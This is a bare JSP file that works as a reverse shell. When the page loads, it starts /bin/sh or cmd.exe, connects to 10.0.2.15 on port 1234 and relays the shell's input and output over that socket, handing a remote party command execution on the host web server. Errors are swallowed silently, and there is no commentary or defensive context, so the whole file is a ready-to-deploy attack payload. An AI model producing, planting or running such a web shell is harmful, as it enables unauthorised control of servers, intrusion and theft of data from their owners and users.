<%@page import="java.lang.*"%>
<%@page import="java.util.*"%>
<%@page import="java.io.*"%>
<%@page import="java.net.*"%>

<%
  class StreamConnector extends Thread
  {
    InputStream od;
    OutputStream wv;

    StreamConnector( InputStream od, OutputStream wv )
    {
      this.od = od;
      this.wv = wv;
    }

    public void run()
    {
      BufferedReader dm  = null;
      BufferedWriter vaz = null;
      try
      {
        dm  = new BufferedReader( new InputStreamReader( this.od ) );
        vaz = new BufferedWriter( new OutputStreamWriter( this.wv ) );
        char buffer[] = new char[8192];
        int length;
        while( ( length = dm.read( buffer, 0, buffer.length ) ) > 0 )
        {
          vaz.write( buffer, 0, length );
          vaz.flush();
        }
      } catch( Exception e ){}
      try
      {
        if( dm != null )
          dm.close();
        if( vaz != null )
          vaz.close();
      } catch( Exception e ){}
    }
  }

  try
  {
    String ShellPath;
if (System.getProperty("os.name").toLowerCase().indexOf("windows") == -1) {
  ShellPath = new String("/bin/sh");
} else {
  ShellPath = new String("cmd.exe");
}

    Socket socket = new Socket( "10.0.2.15", 1234 );
    Process process = Runtime.getRuntime().exec( ShellPath );
    ( new StreamConnector( process.getInputStream(), socket.getOutputStream() ) ).start();
    ( new StreamConnector( socket.getInputStream(), process.getOutputStream() ) ).start();
  } catch( Exception e ) {}
%>
